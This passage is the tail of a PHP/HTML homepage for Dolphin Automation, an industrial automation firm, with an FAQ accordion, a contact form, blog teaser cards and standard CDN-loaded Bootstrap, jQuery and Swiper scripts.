                          d="M889.33376 988.16c-16.1792 0-28.1344-9.52832-31.20128-24.86272-14.50496-75.42272-57.9584-140.672-132.84864-199.51104l-0.6144-0.4352c-5.94432-3.54816-10.04544-9.49248-11.50464-16.96256-1.76128-9.04704 0.4608-19.08736 5.80096-26.20416l0.3328-0.50176c4.56192-7.60832 13.0816-12.12416 23.19872-12.12416 7.296 0 14.592 2.33472 20.00384 6.4 88.0128 67.29728 141.16352 146.95424 158.01344 236.79488 3.16416 18.9952-9.64096 33.83296-23.83872 37.25824l-0.58368 0.14848h-6.7584z m-766.98624-3.6352l-0.49152-0.1024c-9.6768-1.92-15.4368-7.72608-18.56-12.25728-5.00224-7.22944-6.98368-16.56832-5.2992-24.9856 24.38144-128.8704 115.54304-232.09984 243.86048-276.10112l10.0864-3.46112-8.87296-5.9136c-79.40608-52.9408-124.94848-136.18688-124.94848-228.3776 0-154.08128 120.69888-274.78016 274.78016-274.78016 151.51616 0 274.78016 123.264 274.78016 274.78016 0 14.34624-2.35008 33.04448-7.17824 57.1648-2.7904 16.7168-17.91488 25.5488-31.40096 25.5488-2.048 0-4.08064-0.19456-6.02624-0.58368a29.2352 29.2352 0 0 1-19.67104-12.46208c-5.00224-7.24992-6.97856-16.5888-5.2992-24.98048 3.7376-14.93504 3.7376-30.05952 3.7376-44.68224 0-117.21728-95.36512-212.5824-212.5824-212.5824s-212.5824 95.36-212.5824 212.5824c0 117.2224 95.36512 212.58752 212.5824 212.58752 18.11968 0 31.06816 11.5968 34.6368 31.02208l0.09728 0.51712-0.01024 0.52736c-0.4096 18.304-12.61056 30.13632-31.08864 30.13632-169.51808 0-303.14496 101.10464-332.50816 251.58656-3.06176 15.32416-15.01184 24.832-31.19104 24.832h-6.85056z"
                          fill="#fff"></path>
                      </svg></span>
                  </div>
                  <div class="p-2">
                    <h4>24/7 Support</h4>
                    <h6>If you have any questions or have any details to communicate with us, please do not hesitate to
                      contact us.</h6>
                  </div>
                </div>
              </div>
            </div>
          </section>


          <!--FAQS-->
          <div class="faq py-3">
            <div class="container-fluid">
              <div class="row">
                <div class="col-lg-6">
                  <div>
                    <h2 class="py-3">Frequently Asked Questions</h2>
                  </div>

                  <div>
                    <button class="accordion my-1">How does Dolphin Automation ensure product quality?</button>
                    <div class="panel">
                      <p> We maintain rigorous quality control at every stage of the manufacturing process, from raw
                        material procurement to final product testing. Our state-of-the-art research and testing
                        facilities ensure that every product meets the highest standards of performance and
                        durability.</p>
                    </div>

                    <button class="accordion my-1">Does Dolphin Automation provide customization for automation
                      solutions?</button>
                    <div class="panel">
                      <p>Yes, we offer customized automation solutions tailored to meet the specific needs of our
                        clients. Our team works closely with customers to ensure the products align with their
                        operational requirements.</p>
                    </div>

                    <button class="accordion my-1">What makes Dolphin Automation's products stand out?</button>
                    <div class="panel">
                      <p> Our products are known for their durability, reliability, and competitive pricing. With
                        state-of-the-art manufacturing and research facilities, we ensure the highest quality
                        standards while maintaining cost-effectiveness, which gives us a competitive edge in the
                        global market.</p>
                    </div>

                    <button class="accordion my-1">How can I place an order or get a quote for Dolphin Automation
                      products?</button>
                    <div class="panel">
                      <p>You can contact our sales team directly via our website or customer service helpline. We will
                        guide you through the product selection process and provide a customized quote based on your
                        requirements.</p>
                    </div>

                    <button class="accordion my-1">How do Capacitive Sensors differ from Inductive Sensors?</button>
                    <div class="panel">
                      <p>While Inductive Sensors detect only metal objects, Capacitive Sensors can detect both metal
                        and non-metal objects, such as liquids, plastics, and granular materials. This makes them
                        ideal for use in level detection and material handling applications.</p>
                    </div>

                  </div>
                </div>
                <div class="col-lg-6 ">

                  <h2 class="py-2 blue  text-center">Didn't find answer of your question?</h2>

                  <form action="mail2.php" method="post" class="container">
                    <div class="row mb-3">
                        <div style="display:none;">
            <label for="honeypot">Leave this field blank:</label>
            <input type="text" name="hidden_input" />
        </div>
                      <label for="inputName3" class="col-sm-2 col-form-label">Name</label>
                      <div class="col-sm-10">
                        <input type="Name" name="name" class="form-control" id="inputName3" placeholder="FullName"
                          style="background:rgb(245, 244, 244)">
                      </div>
                    </div>


                    <div class="row mb-3">
                      <label for="inputEmail3" class="col-sm-2 col-form-label">Email</label>
                      <div class="col-sm-10">
                        <input type="email" name="email" class="form-control" id="inputEmail3" placeholder="Email"
                          style="background:rgb(245, 244, 244)">
                      </div>
                    </div>


                    <div class="row mb-3">
                      <label for="inputPhone3" class="col-sm-2 col-form-label">Phone</label>
                      <div class="col-sm-10">
                        <input type="phone" name="phone" class="form-control" id="inputPhone3" placeholder="Phone"
                          style="background:rgb(245, 244, 244)">
                      </div>
                    </div>

                    <div class="row mb-3">
                      <label for="inputQuestion3" class="col-sm-2 col-form-label">Question</label>
                      <div class="col-sm-10">
                        <textarea type="Question" name="question" class="form-control" id="inputQuestion3"
                          placeholder="Write your query here.." style="background:rgb(245, 244, 244)"></textarea>
                      </div>
                    </div>

                    <div class="justify-content-center align-items-center d-flex pt-4">
                      <button type="submit" name="submit" class="frm-btn ">Raise your query</button>
                    </div>

                  </form>
                </div>
              </div>

            </div>
          </div>


          <!--DELIGHTED SECTION-->
          <div class="delighted py-4">
            <div class="">
              <div class="container ">
                <div class="container-fluid ab-strips mb-2" style="background: rgb(240, 239, 239);">
                  <div class="row">
                    <div class="col-lg-4" style="padding-left:0 !important">
                      <img src="assets/imgs/creatives2/7xm.xyz808250.png" alt="" width="60%" class="str-img">
                    </div>
                    <div class="col-lg-8 strip-data justify-content-center">
                      <h3>Delight our customers</h3>
                      <p>We understand that each customer’s needs are unique, so we offer tailored automation solutions.
                        Whether it's a specific sensor requirement or an entire control system, we work closely with our
                        clients to deliver exactly what they need.
                      </p>
                    </div>
                  </div>
                </div>

                <div class="container-fluid ab-strips mb-2" style="background: rgb(255, 255, 255);">
                  <div class="row">

                    <div class="col-lg-8 strip-data justify-content-center">
                      <h3>Double our size and profitability</h3>
                      <p>We focus on deepening relationships with existing customers by offering service contracts,
                        upgrades, and system expansions. Automating after-sales support can also improve client
                        satisfaction and create recurring revenue streams.
                      </p>
                    </div>
                    <div class="col-lg-4 text-end" style="padding-right:0 !important">
                      <img src="assets/imgs/creatives2/fofo.png" alt="" width="60%" class="str-img1">
                    </div>

                  </div>
                </div>


                <div class="container-fluid ab-strips mb-2" style="background: rgb(240, 239, 239);">
                  <div class="row">
                    <div class="col-lg-4" style="padding-left:0 !important">
                      <img src="assets/imgs/creatives2/7xm.xyz872335.png" alt="" width="60%" class="str-img">
                    </div>
                    <div class="col-lg-8 strip-data justify-content-center">
                      <h3>
                        Realise the potential of our people</h3>
                      <p>Unlock the full potential of our people by fostering a culture of innovation, continuous
                        learning, and empowerment. We believe that investing in our team’s growth drives excellence and
                        success across every aspect of our business.


                      </p>
                    </div>
                  </div>
                </div>

                <div class="container-fluid ab-strips mb-2" style="background: rgb(255, 255, 255);">
                  <div class="row">

                    <div class="col-lg-8 strip-data justify-content-center">
                      <h3>Lead the way in sustainability</h3>
                      <p>Lead the way in sustainability by integrating eco-friendly practices. From energy-efficient
                        products to responsible manufacturing, we are committed to reducing our environmental impact
                        while driving innovation for a greener future.


                      </p>
                    </div>

                    <div class="col-lg-4 text-end" style="padding-right:0 !important">
                      <img src="assets/imgs/creatives2/7xm.xyz459865.png" alt="" width="60%" class="str-img1">
                    </div>

                  </div>
                </div>


              </div>
            </div>
          </div>
          <!--CONTACT US REQUEST SECTION-->
          <div>
            <div class="container m-info m-info1 p-">
              



              <div class="container m-info-n py-0 text-center justify-content-center py-3">
                <div class="row justify-content-center">
                  <div class="col-lg-3 frm col-3">
                    <h1>1000+</h1>
                    <h5>Products</h5>
                  </div>
                  <div class="col-lg-3 frm col-3">
                    <h1>500+</h1>
                    <h5>Partners</h5>
                  </div>
                  <div class="col-lg-3 frm col-3">
                    <h1 >60+ </h1>
                    <h5>Staff</h5>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!--BLOG POSTS-->
          <div>
            <h3 class="m-title text-uppercase text-center py-4">Our Blogs</h3>
            <div class="container py-0 blog-card">
              <div>

                <div>
                  <div class="swiper mySwiper1">
                    <div class="swiper-wrapper">
                      <div data-hash="slide1" class="swiper-slide d-flex">

                        <div class="card card-scale">
                          <img src="assets/imgs/blog-img/image 78 (2).png" class="card-img-top" alt="..." width="100%">
                          <div class="card-body">
                            <h5 class="card-title">The Next Generation: An Exploration of the
                              Industrial Internet of Things</h5>

                            <a href="blog-1.php" class=" btn-blog">Read More</a>
                          </div>
                        </div>
                      </div>

                      <div data-hash="slide2" class="swiper-slide d-flex">
                        <div class="card card-scale">
                          <img src="assets/imgs/blog-img/image 76 (2).png" class="card-img-top" alt="..." width="100%">
                          <div class="card-body ">
                            <h5 class="card-title py-2">Improving The IIoT In The Power and Energy Sector: A Complete
                              Handbook
                            </h5>

                            <a href="blog-2.php" class=" btn-blog">Read More</a>
                          </div>
                        </div>
                      </div>
                      <div data-hash="slide3" class="swiper-slide d-flex">
                        <div class="card card-scale">
                          <img src="assets/imgs/blog-img/image (11).png" class="card-img-top" alt="..." width="100%">
                          <div class="card-body">
                            <h5 class="card-title py-2">A Guide to Power Analysis and Measurement For Our Clients
                            </h5>

                            <a href="blog-3.php" class=" btn-blog">Read More</a>
                          </div>
                        </div>

                      </div>
                      <div data-hash="slide4" class="swiper-slide d-flex">
                        <div class="card card-scale">
                          <img src="assets/imgs/blog-img/image 77 (2).png" class="card-img-top" alt="..." width="100%">
                          <div class="card-body">
                            <h5 class="card-title py-2">Enhancing Power Supply: The Role of Cooling
                              Techniques-Read More </h5>

                            <a href="blog-4.php" class=" btn-blog">Read More</a>
                          </div>
                        </div>

                      </div>
                      <div data-hash="slide5" class="swiper-slide d-flex">
                        <div class="card card-scale">
                          <img src="assets/imgs/blog-img/image 99 (1).png" class="card-img-top" alt="..." width="100%">
                          <div class="card-body">
                            <h5 class="card-title py-2">PID Controller: Types, Working and its
                              Application-Read Now </h5>

                            <a href="blog-5.php" class=" btn-blog">Read More</a>
                          </div>
                        </div>

                      </div>
                      <div data-hash="slide6" class="swiper-slide d-flex">
                        <div class="card card-scale">
                          <img src="assets/imgs/blog-img/image 75 (2).png" class="card-img-top" alt="..." width="100%">
                          <div class="card-body">
                            <h5 class="card-title py-2">Picking the right Solid-State Relay: A guide that include all
                              aspects.</h5>

                            <a href="blog-6.php" class=" btn-blog">Read More</a>
                          </div>
                        </div>

                      </div>

                      <div data-hash="slide7" class="swiper-slide d-flex">
                        <div class="card card-scale">
                          <img src="assets/imgs/blog-img/download 2 (2).png" class="card-img-top" alt="..."
                            width="100%">
                          <div class="card-body">
                            <h5 class="card-title py-2">Photoelectric Sensors : A complete HandBook for our Clients</h5>

                            <a href="blog-7.php" class=" btn-blog">Read More</a>
                          </div>
                        </div>

                      </div>


                      <div data-hash="slide7" class="swiper-slide d-flex">
                        <div class="card card-scale">
                          <img src="assets/imgs/blog-img/104_0_8e111554057f4494b74fb1325263a664 1.png"
                            class="card-img-top" alt="..." width="100%">
                          <div class="card-body">
                            <h5 class="card-title">The Future of Power Supplies - Advances in Energy Efficiency</h5>

                            <a href="blog-8.php" class=" btn-blog">Read More</a>
                          </div>
                        </div>

                      </div>

                    </div>
                    <div class="swiper-button-next" style="color:black"></div>
                    <div class="swiper-button-prev" style="color:black"></div>

                  </div>
                </div>
              </div>
            </div>
          </div>

          <!--curve section-->
          <section class="c-full">
            <div class="container-fluid">
              <div class="row">
                <div class="col-lg-4 c-half1 py-5">
                  <h3 class="fw-bold">Dolphin Automation</h3>
                  <h6>Contact us for more</h6>
                </div>
                <div class="col-lg-8  c-half2 py-5">
                  <h3>Its The Best Solution</h3>
                  <h6>At Dolphin Automation we are fully committed to providing our customers with the very best in
                    automation and suspended platform. We believe in going the extra mile to ensure that each customer
                    is satisfied. </h6>
                </div>
              </div>
            </div>
          </section>


       
        </div>
      </div>
    </div>

    <?php include 'includes/footer.php' ?>
    <script src="assets/js/main.js"></script>
    <script src="assets/js/jquery.fancybox.js"></script>
    <!-- bootstarp js -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
      crossorigin="anonymous"></script>

    <!-- Bootstrap JS (via CDN) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>

    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
      integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
      crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
      integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
      crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"
      integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
      crossorigin="anonymous"></script>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
    <script src="responsiveslides.min.js"></script>

    <script>
      $(function () {
        $(".rslides").responsiveSlides();
      });
    </script>

    <!-- Swiper JS -->
    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>


    <script>
      var acc = document.getElementsByClassName("accordion");
      var i;

      for (i = 0; i < acc.length; i++) {
        acc[i].addEventListener("click", function () {
          this.classList.toggle("active");
          var panel = this.nextElementSibling;
          if (panel.style.maxHeight) {
            panel.style.maxHeight = null;
          } else {
            panel.style.maxHeight = panel.scrollHeight + "px";
          }
        });
      }
    </script>

    <!-- Initialize Swiper -->
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        document.querySelectorAll('.sidebar .nav-link').forEach(function (element) {

          element.addEventListener('click', function (e) {

            let nextEl = element.nextElementSibling;
            let parentEl = element.parentElement;

            if (nextEl) {
              e.preventDefault();
              let mycollapse = new bootstrap.Collapse(nextEl);

              if (nextEl.classList.contains('show')) {
                mycollapse.hide();
              } else {
                mycollapse.show();
                // find other submenus with class=show
                var opened_submenu = parentEl.parentElement.querySelector('.submenu.show');
                // if it exists, then close all of them
                if (opened_submenu) {
                  new bootstrap.Collapse(opened_submenu);
                }
              }
            }
          }); // addEventListener
        }) // forEach
      });
      // DOMContentLoaded  end

    </script>
    <script>
      var swiper = new Swiper(".mySwiper", {
        spaceBetween: 10,
        speed:3000,
        autoplay: {
          delay: 0,
          disableOnInteraction: false,
        },
        pagination: {
          el: ".swiper-pagination",
          clickable: true,
        },
        navigation: {
          nextEl: ".swiper-button-next",
          prevEl: ".swiper-button-prev",
        },
        breakpoints: {
          320: {
            slidesPerView: 3,
          },
          640: {
            slidesPerView: 3,
          },
          768: {
            slidesPerView: 7,
          },
          1024: {
            slidesPerView: 7,
          },
        },
      });
    </script>

    <script>
      var swiper = new Swiper(".mySwiper1", {
        spaceBetween: 30,
        hashNavigation: {
          watchState: true,
        },
        pagination: {
          el: ".swiper-pagination",
          clickable: true,
        },
        navigation: {
          nextEl: ".swiper-button-next",
          prevEl: ".swiper-button-prev",
        },
        breakpoints: {
          640: {
            slidesPerView: 1,
          },
          768: {
            slidesPerView: 2,
          },
          1024: {
            slidesPerView: 3,
          },
        },
      });
    </script>
    <script>
      const counters = document.querySelectorAll('.value');
      const speed = 200;

      counters.forEach(counter => {
        const animate = () => {
          const value = +counter.getAttribute('akhi');
          const data = +counter.innerText;

          const time = value / speed;
          if (data < value) {
            counter.innerText = Math.ceil(data + time);
            setTimeout(animate, 1);
          } else {
            counter.innerText = value;
          }

        }

        animate();
      });



    </script>

    <script>
      const progressCircle = document.querySelector(".autoplay-progress svg");
      const progressContent = document.querySelector(".autoplay-progress span");
      var swiper = new Swiper(".mySwiper10", {
        spaceBetween: 30,
        centeredSlides: true,
        autoplay: {
          delay: 2500,
          disableOnInteraction: false
        },
        pagination: {
          el: ".swiper-pagination",
          clickable: true
        },
        navigation: {
          nextEl: ".swiper-button-next",
          prevEl: ".swiper-button-prev"
        },
        on: {
          autoplayTimeLeft(s, time, progress) {
            progressCircle.style.setProperty("--progress", 1 - progress);
            progressContent.textContent = `${Math.ceil(time / 1000)}s`;
          }
        }
      });
    </script>
    <script src="assets/js/main.js"></script>
</body>

</html>